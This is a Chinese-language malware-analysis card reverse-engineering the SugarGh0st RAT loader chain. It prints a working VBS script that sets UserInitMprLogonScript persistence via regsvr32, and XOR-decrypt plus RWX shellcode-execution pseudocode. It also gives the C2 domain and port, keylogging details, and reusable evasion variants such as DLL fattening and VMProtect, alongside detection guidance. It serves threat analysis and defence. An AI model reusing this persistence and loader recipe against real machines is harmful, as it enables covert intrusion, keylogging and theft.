---
id: code-analysis-reverse-windows-sugargH0st-vbs-logon-fat-vmp-dll-authz-lib-xor-shellcode
title: SugarGh0st 2023-12 加载链：VBS 登录脚本持久化 + 250MB 增肥 VMP DLL + authz.lib XOR shellcode 内存加载 RAT
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: sugargH0st-vbs-logon-fat-dll-vmp-authzlib-xor-loader
aliases:
- SugarGh0st
- SugarGh0st RAT
- Gh0st 变种
- update.dll
- authz.lib
- UserInitMprLogonScript VBS
- DLL 增肥
- 250MB DLL
tags:
- windows
- malware
- malware-analysis
- sugargH0st
- gh0st
- vmp
- dll-fattening
- logon-script
- xor-shellcode
- keylogger
- apt
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V533
  verified_at: '2026-11-11T17:22:25+08:00'
  notes: 已对照原文与21张截图逐张核对：图02为~tmp.vbs(1KB)/authz.lib(35KB)/update.dll(250,972KB)文件清单；图03 VBS的UserInitMprLogonScript=regsvr32.exe /s %temp%\update.dll与default.doc诱饵；图05 DIE识别VMProtect(1.60-2.05)/MSVC6.0/PE32/DLL，update.dll为250,972KB约245MB；图06 .vmp2 DllEntryPoint、图07脱壳后OEP；图08-10 authz.lib读取与XOR循环（已据图修正key表述：key为sub_1001330F返回值且与循环长度同值，原稿文件头推测已删除）；图11解密后E9开头；图12/13 GetProcAddress+VirtualAlloc；图14内存PE（MZ/PE/.text/.rdata/.data）；图15互斥体account.drive-google-com.tk；图16 WinRAR\WinLog.txt键盘记录；图17 2023.12与443；图18 connect循环；图19 SeShutdownPrivilege/ExitWindowsEx/ClearEventLogW/RegSetValueExW；图20主机信息send/recv；图21文件命令集。关联卡userinitmprlogonscript-environment、vmprotect-oep、silverfox-gh0st均存在且verified。dedup：仅自身exact匹配，WINWORD侧载/其他XOR内存加载卡均非同链；dup-scan无涉及pair。未验证点：未实际脱壳运行样本，authz.lib解密key的内部计算未展开。
---

## 一句话结论

SugarGh0st 2023-12 样本把钓鱼压缩包自解压为 `~tmp.vbs`、`authz.lib`、`update.dll` 三个文件：VBS 向 `HKCU\Environment\UserInitMprLogonScript` 写入 `regsvr32.exe /s %temp%\update.dll` 实现用户级登录持久化并打开诱饵文档；`update.dll` 被增肥到约 250MB 并用 VMProtect 加壳；脱壳后 DLL 读取 `%TEMP%\authz.lib`，用 `byte[i] ^= key ^ (i*i) ^ 0x11` 异或解密出 shellcode，经 VirtualAlloc 跳转执行；shellcode 再解密内存中的 SugarGh0st RAT PE，RAT 以 C2 域名作互斥体、连接 443 端口、记录键盘并执行文件/关机/注册表等 C2 命令。

## 原理

- **投递与自解压**：钓鱼压缩包自解压后在目录生成 `~tmp.vbs`（1KB）、`authz.lib`（35KB）、`update.dll`（250,972KB）。VBS 以 `WScript.Shell` 写注册表：`HKCU\Environment\UserInitMprLogonScript = "regsvr32.exe /s %temp%\update.dll"`，登录时由 `userinit.exe` 执行，普通用户权限即可（该持久化机制详见 `pentest-persistence-windows-userinitmprlogonscript-environment`）；随后 `obj.run "%temp%\default.doc",1` 打开诱饵文档掩盖行为。
- **DLL 增肥 + VMP**：`update.dll` 为 PE32，约 245MB（大量填充数据），Detect It Easy 识别 `VMProtect(1.60-2.05)`、MSVC 6.0；入口在 `.vmp2` 段，`DllEntryPoint` 先跳到 VM stub 解压/还原，再回到真实 `DllEntryPoint`（脱壳点）。增肥让文件体积远超常见扫描/上传限制，VMP 增加静态分析与脱壳成本，两者叠加提高免杀率。
- **authz.lib 异或解密**：脱壳后的 DLL 以 `CreateFileA` 打开 `%TEMP%\authz.lib`，读入内存；用异或循环解密：
  ```c
  for (i = 0; i < len; ++i)
      buf[i] ^= key ^ (i * i) ^ 0x11;
  ```
  `key` 即读取辅助函数 `sub_1001330F` 的返回值（同时作为循环长度，从用法看与文件长度一致；截图未展开该函数内部）。解密后首字节为 `E9 ...`（jmp），是位置无关的 shellcode。
- **shellcode 加载 RAT**：shellcode 通过 PEB/导入表或 `GetProcAddress` 解析 `VirtualAlloc` 等 API，分配 RWX 内存，把内嵌的 SugarGh0st RAT PE 解密到内存并跳转执行；内存中出现 `MZ`/`PE` 头与 `.text/.rdata/.data` 节，说明 RAT 以反射/内存 PE 方式运行，不落盘。
- **RAT 行为**：创建互斥体，名字直接使用 C2 域名 `account.drive-google-com.tk`（域名为仿冒 Google Drive 的 `.tk` 域名）；硬编码端口 443，`WSAStartup`/`socket`/`connect` 连接 C2；启动键盘记录线程，写入 `%APPDATA%\WinRAR\WinLog.txt`（`SHGetFolderPath` + `CreateDirectory` + `GetAsyncKeyState`，记录回车等按键）；采集计算机名/内存等主机信息发送给 C2，然后循环 `recv` 执行 C2 命令。
- **C2 命令集**：包括文件操作（`SHGetFileInfoW`、EnumFiles、`DeleteFileW`、`MoveFileW`/`MoveFileExW`、`CopyFileW`、`CreateProcess`/`ShellExecuteW`、下载文件线程）、关机/重启/终止进程（`AdjustTokenPrivileges(SeShutdownPrivilege)` + `ExitWindowsEx`）、清空事件日志（`ClearEventLogW`）、写注册表（`RegSetValueExW`）等；样本中硬编码编译时间字符串 `2023.12`。
- **为什么可复用**：该链展示了“用户级登录脚本持久化 + 大体积 VMP DLL 免杀 + 外部数据文件 XOR shellcode + 内存 PE RAT”的组合；每一段都可替换（VBS→其他脚本、authz.lib→任意数据文件、SugarGh0st→其他内存 PE），检测点也分别落在注册表、超大 DLL、Temp 数据文件与内存 PE 上。

## 触发条件

- 受害者打开钓鱼压缩包并执行自解压/VBS（或 VBS 由其它 loader 启动）。
- 当前用户可写 `HKCU\Environment` 与 `%TEMP%`；系统允许 `regsvr32.exe` 执行。
- `update.dll` 可被 `regsvr32 /s` 加载（DLL 导出 `DllRegisterServer`/`DllEntryPoint`），VMP 脱壳逻辑在目标环境可运行。
- 目标可出站访问 C2 域名 443 端口；RAT 以内存方式运行，不依赖落盘。
- 键盘记录目录 `%APPDATA%\WinRAR` 可创建/写入。

## 利用步骤

1. 钓鱼压缩包自解压释放 `~tmp.vbs`、`authz.lib`、`update.dll`。
2. VBS 写 `HKCU\Environment\UserInitMprLogonScript` 指向 `regsvr32.exe /s %temp%\update.dll`，并打开 `default.doc` 诱饵。
3. 用户下次登录时 `userinit.exe` 执行 regsvr32，加载 VMP 加壳的 `update.dll`；VM stub 脱壳后进入真实 `DllEntryPoint`。
4. DLL 读取 `%TEMP%\authz.lib`，按 `key ^ (i*i) ^ 0x11` 异或解密出 shellcode。
5. shellcode 解析 API、`VirtualAlloc` 分配内存、解密内嵌 SugarGh0st RAT PE 并跳转。
6. RAT 创建以 C2 域名命名的互斥体，连接 `account.drive-google-com.tk:443`，启动键盘记录、上报主机信息、进入 C2 命令循环。

## PoC

原文为样本逆向，无武器化 PoC。关键代码/行为（截图还原）：

VBS 持久化：

```vbs
on Error Resume next
set obj=wscript.createObject("wscript.shell")
obj.RegWrite "HKCU\Environment\UserInitMprLogonScript","regsvr32.exe /s %temp%\update.dll"
obj.run "%temp%\default.doc",1
```

authz.lib 异或解密（伪代码）：

```c
CreateFileA("%TEMP%\\authz.lib", GENERIC_READ, ...);
ReadFile(...);
for (i = 0; i < len; ++i)
    buf[i] ^= len ^ (i * i) ^ 0x11;   // key 为读取辅助函数 sub_1001330F 的返回值，与 len 同值
VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(alloc, buf, size);
((void(*)())alloc)();
```

RAT 互斥体与 C2（截图）：

```c
CreateMutexA(0, 1, "account.drive-google-com.tk");
hostshort = 443;
WSAStartup(...); socket(AF_INET, SOCK_STREAM, 0);
connect(sock, &name, 16);
```

键盘记录输出：`%APPDATA%\WinRAR\WinLog.txt`。

## 变体与关联

- 关联：用户级登录脚本持久化的注册表机制与普通用户权限边界见 `pentest-persistence-windows-userinitmprlogonscript-environment`。
- 关联：VMProtect 脱壳/入口点还原见 `code-analysis-reverse-unpacking-vmprotect-compression-sleep-cookie-oep-import-fix`；Gh0st 系内存加载与 C2 行为可参考 `pentest-c2-silverfox-gh0st-vmprotect-rc4-clrcreateinstance`。
- 变体：DLL 增肥可换成追加随机节/资源、超大 overlay；authz.lib 可换成任意伪装扩展名的加密 shellcode；VBS 可换成 JS/bat/lnk。
- 边界：VMP 版本与目标系统兼容性、regsvr32 是否被禁用、C2 域名是否已失效都会影响复现；原文未提供样本执行成功截图，confidence 定为 medium。

## 检测与防御

- 检测：`HKCU\Environment\UserInitMprLogonScript` 出现 `regsvr32`/`wscript`/`%temp%` 等异常值；用户登录时 `userinit.exe` → `regsvr32.exe` 加载 `%TEMP%` 下的 DLL。
- 检测：`%TEMP%` 出现超大（数百 MB）DLL 与 `authz.lib` 等非标准扩展名数据文件；DLL 入口落在 `.vmp2`/VMProtect 特征段；进程内存出现无模块 PE（MZ/PE 头）与 RWX 页。
- 检测：互斥体名等于外部域名（如 `account.drive-google-com.tk`）；进程连接仿冒云盘域名 443；`%APPDATA%\WinRAR\WinLog.txt` 键盘记录文件。
- 防御：禁用/限制 `wscript`/`regsvr32` 的异常调用；监控 HKCU Environment 键；EDR 检测内存 PE、RWX 与键盘记录 API；出口域名信誉拦截。
